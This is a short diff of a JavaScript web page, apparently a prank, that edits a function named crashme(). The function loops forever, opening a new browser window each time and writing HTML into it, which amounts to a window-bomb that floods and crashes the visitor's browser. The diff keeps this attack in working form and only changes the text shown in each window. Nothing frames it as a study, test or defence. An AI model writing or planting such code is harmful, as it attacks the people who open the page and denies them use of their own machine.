@@ -48,6 +48,9 @@
        function crashme() {
            var i, new_win, new_doc;
 
+
+           var i, new_win, new_doc;
+
            for(i = 1; ;++i)
            {
                new_win = window.open("blank.htm", "wind" + i);
@@ -56,15 +59,15 @@
                new_doc.writeln("<html>");
                new_doc.writeln("<head>");
                new_doc.writeln("<title>Windows #" + i + "</title>");
-               new_doc.writeln("<h3>No" + i + "</h3>");
+               new_doc.writeln("<h3>Windows #" + i + "</h3>");
                new_doc.writeln("<hr>");
                new_doc.writeln("</head>");
                new_doc.writeln("<body>");
-               new_doc.writeln("<h1>no</h1>");
                new_doc.writeln("</body>");
                new_doc.writeln("</html>");
                new_doc.close();
            }
+
        }
         function submit() {
               document.write("ok babes");
